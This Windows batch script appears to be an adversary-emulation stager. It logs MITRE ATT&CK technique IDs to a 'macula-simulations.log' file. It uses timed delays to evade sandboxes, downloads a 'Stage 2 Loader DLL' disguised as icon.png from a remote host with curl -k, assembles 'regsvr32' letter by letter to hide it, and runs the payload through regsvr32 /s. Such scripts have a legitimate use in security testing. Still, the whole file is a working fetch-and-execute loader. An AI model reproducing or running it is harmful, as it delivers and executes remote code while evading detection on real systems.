@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_* placeholder assignments (random-named SET variables)
SET hxrqy=%APPDATA%\11000\d0ef19cd
SET klmnp=7d27ecfd.txt
SET asdfg=https://10.0.0.49/stage/2/icon.png?11000-7
SET zxcvb=BALAM-S2BO
SET qwert=11000
SET yuiop=7
SET bnmp=%PUBLIC%\\macula-simulations.log
SET lkjhg=https://10.0.0.49

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM Log file variable
SET logvar=!bnmp!

REM Agent and simulation ID variables for logging
SET agentvar=!zxcvb!
SET simidvar=!qwert!

REM ======== ANTI-ANALYSIS AND DELAYS (T1497) ========
REM Initial delay (10-20s)
timeout /t 15 /nobreak >nul
REM Random delay (10-30s)
SET /A r1=%RANDOM% %% 20 + 10
timeout /t !r1! /nobreak >nul
REM Simulated debugger check (always add a small random sleep)
SET /A antidelay=%RANDOM% %% 3 + 2
timeout /t !antidelay! /nobreak >nul
REM Log T1497
echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1497^|Virtualization/Sandbox Evasion=OK: >> "!logvar!" 2>nul

REM ======== HEARTBEAT DOWNLOAD (T1105 - logged as T1218? No, debug only) ========
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_start>> "!logvar!" 2>nul
REM Create output directory if missing
mkdir "!hxrqy!" 2>nul
REM Download the Stage 2 Loader DLL
curl -k -s -o "!hxrqy!\!klmnp!" "!asdfg!" 2>> "!logvar!" 2>nul
if errorlevel 1 (set dlresult=FAIL) else (set dlresult=OK)
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: heartbeat_complete=!dlresult!>> "!logvar!" 2>nul

REM Additional delay (5-15s) using ping
ping -n 8 127.0.0.1 >nul

REM ======== CHANGE DIRECTORY ========
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_start>> "!logvar!" 2>nul
cd /d "!hxrqy!" >nul 2>&1
if errorlevel 1 (set chdirres=1) else (set chdirres=0)
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: chdir_result=!chdirres!>> "!logvar!" 2>nul

REM ======== OBFUSCATE LOLBIN INVOCATION (T1027) ========
REM Build regsvr32.exe character by character
SET c1=r
SET c2=e
SET c3=g
SET c4=s
SET c5=v
SET c6=r
SET c7=3
SET c8=2
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%.exe
REM Build /s argument
SET a1=/
SET a2=s
SET arg=%a1%%a2%
REM Log T1027 (obfuscation applied)
echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1027^|Obfuscated Files or Information=OK: >> "!logvar!" 2>nul

REM ======== EXECUTE VIA LOLBIN (T1218) ========
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: lolbin_start>> "!logvar!" 2>nul
%lolbin% %arg% "!klmnp!"
SET exitcode=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!agentvar!][!simidvar!]: lolbin_complete=!exitcode!>> "!logvar!" 2>nul

REM Log T1218 result
if !exitcode! equ 0 (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=OK: >> "!logvar!" 2>nul
) else (
    echo [!tsvar!][TTP][!agentvar!][!simidvar!]: T1218^|System Binary Proxy Execution=FAIL:EXITCODE=!exitcode! >> "!logvar!" 2>nul
)

REM Exit cleanly
exit /b 0